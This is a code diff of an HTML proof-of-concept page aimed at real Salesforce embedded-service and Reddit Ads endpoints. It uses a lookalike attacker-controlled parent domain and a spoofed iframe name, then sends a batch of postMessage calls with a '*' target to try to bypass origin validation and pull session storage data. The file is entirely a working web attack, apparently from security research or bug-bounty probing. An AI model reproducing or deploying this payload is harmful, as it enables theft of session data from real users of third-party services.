@@ -1,37 +1,65 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Salesforce Bypass Testing</title>
+    <style>
+      body { font-family: sans-serif; padding: 1rem; }
+      iframe { width: 600px; height: 400px; border: 1px solid #ccc; }
+    </style>
+  </head>
   <body>
-    <h2>Salesforce Origin Validation Bypass PoC</h2>
+    <h3>PostMessage Origin Bypass PoC</h3>
+    <p>Testing <code>window.name</code>, timing, and multiple message types.</p>
 
     <iframe
-      id="sfdcFrame"
+      id="sf-iframe"
+      name="https://ads.reddit.com"
       src="https://service.force.com/embeddedservice/5.0/esw.html?parent=https://ads.reddit.com.wangdubruh.xyz"
-      width="600"
-      height="400"
     ></iframe>
 
     <script>
-      const iframe = document.getElementById("sfdcFrame");
+      const iframe = document.getElementById("sf-iframe");
 
       iframe.onload = () => {
-        console.log("[+] Iframe loaded");
+        console.log("[+] Iframe loaded. Sending messages after delay...");
 
-        iframe.contentWindow.postMessage(
-          {
-            method: "getSessionStorageData",
-            deploymentId: "test-bypass",
-            domain: "ads.reddit.com"
-          },
-          "*"
-        );
+        // Delay to let iframe initialize
+        setTimeout(() => {
+          const testMessages = [
+            {
+              method: "getSessionStorageData",
+              domain: "ads.reddit.com",
+              deploymentId: "test123"
+            },
+            {
+              method: "session.updateStorage",
+              domain: "ads.reddit.com",
+              data: {
+                deploymentId: "test123",
+                isSamePageNavigation: true,
+                isRefresh: false
+              }
+            },
+            {
+              method: "session.frameReady",
+              domain: "ads.reddit.com"
+            },
+            {
+              method: "session.onLoad",
+              domain: "ads.reddit.com"
+            }
+          ];
+
+          testMessages.forEach((msg, i) => {
+            console.log(`[📤] Sending message ${i + 1}:`, msg);
+            iframe.contentWindow.postMessage(msg, "*");
+          });
+        }, 1000);
       };
 
-      window.addEventListener("message", (e) => {
-        console.log("[📩] Message from iframe:", e.data);
-        document.body.insertAdjacentHTML(
-          "beforeend",
-          `<pre>${JSON.stringify(e.data, null, 2)}</pre>`
-        );
+      // Receive responses
+      window.addEventListener("message", (event) => {
+        console.log("[📩] Message from iframe:", event.data);
       });
     </script>
   </body>
